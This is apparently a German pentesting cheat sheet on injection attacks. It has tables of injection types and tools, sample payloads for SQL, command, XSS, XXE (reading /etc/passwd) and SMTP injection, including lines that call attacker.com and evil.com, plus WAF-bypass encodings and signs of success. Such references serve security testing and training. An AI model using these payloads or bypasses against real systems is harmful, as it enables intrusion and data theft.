| Typ                                | Ziel                 | Beschreibung                           |
| ---------------------------------- | -------------------- | -------------------------------------- |
| **SQL Injection**                  | Datenbanken          | Manipulation von SQL-Abfragen          |
| **Command Injection**              | Shell                | Ausführung systemweiter Befehle        |
| **LDAP Injection**                 | Directory Services   | Manipulation von LDAP-Filterausdrücken |
| **XSS** (Reflektiert, Stored, DOM) | Browser              | Einschleusen von JavaScript            |
| **XML Injection / XXE**            | XML-Parser           | Zugriff auf Files, SSRF über XML       |
| **NoSQL Injection**                | MongoDB, CouchDB     | Manipulation von JSON-Queries          |
| **SMTP Injection**                 | Mailserver           | Einschleusen von Mail-Kommandos        |
| **CRLF Injection**                 | HTTP Header          | HTTP-Response Splitting                |
| **XPath Injection**                | XML-Datenbank        | Manipulation von XPath-Ausdrücken      |
| **SSI Injection**                  | Server-Side Includes | Serverseitige Codeausführung           |
| **Host Header Injection**          | HTTP-Header          | SSRF, Reset-Links hijacken             |
| **Template Injection (SSTI)**      | Template Engines     | Server-Side Code Execution             |
| **GraphQL Injection**              | GraphQL APIs         | Query-Manipulation und introspection   |

' " ` ; ) ( < > ${} || && //


'; WAITFOR DELAY '0:0:5'--        # SQLi Time

| sleep 5                         # Command Inj.

`nslookup attacker.com`          # Blind CMD

"><script>alert(1)</script>      # XSS

# <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

" | mail -s pwn me@evil.com      # SMTP Inj.

| Typ          | Tool                                | Zweck                |
| ------------ | ----------------------------------- | -------------------- |
| SQLi         | `sqlmap`, `Burp`, `sqlitebrowser`   | Vollautomatisierung  |
| CMD          | `Commix`, `Burp`, `curl`            | Command Exec         |
| XSS          | `XSStrike`, `Dalfox`, `XSScrapy`    | Kontextanalyse       |
| XML / XXE    | `Burp`, `XXEinjector`, `xmlstarlet` | File Read, SSRF      |
| SSTI         | manuell / `tplmap`                  | Template-Injektion   |
| LDAP / XPath | manuell                             | Logikfehler erzeugen |
| NoSQL        | `NoSQLMap`, `Burp`                  | JSON-Manipulation    |


**Bypassing WAFs & Filters:**
| Technik              | Beispiel                          |
| -------------------- | --------------------------------- |
| URL-Encoding         | `%27` statt `'`                   |
| Doppel-Encoding      | `%2527`                           |
| Keyword-Splitting    | `SEL/**/ECT`                      |
| Case-Bypass          | `SeLeCt`                          |
| Whitespaces ersetzen | `+`, `%09`, `%0a`                 |
| Comments             | `UN/**/ION/**/SELECT`             |
| Obfuscation          | `char(97)+char(100)+char(109)...` |

| Kontext       | Beispiel-Injektion             |   |                |
| ------------- | ------------------------------ | - | -------------- |
| GET-Parameter | `/index.php?id=1' -- `         |   |                |
| POST-Body     | `username=admin' -- `          |   |                |
| JSON-API      | `{"user":"admin' -- "}`        |   |                |
| HTTP-Header   | \`User-Agent: '                |   | sleep(5) -- \` |
| Cookies       | `Cookie: session=1' or '1'='1` |   |                |
| URL-Path      | `/product/' OR 1=1--`          |   |                |


| Indikator              | Bedeutung                        |
| ---------------------- | -------------------------------- |
| SQL-Fehler             | `mysql_fetch...`, `syntax error` |
| Verzögerung            | Time-Based Blind                 |
| Ungewöhnliche Ausgaben | z. B. `uid=0(root)`              |
| Reflektierter Payload  | XSS wahrscheinlich               |
| Zugriff auf Files      | XXE, CMD                         |
| Statuscode 500/403/301 | Filterung oder WAF               |
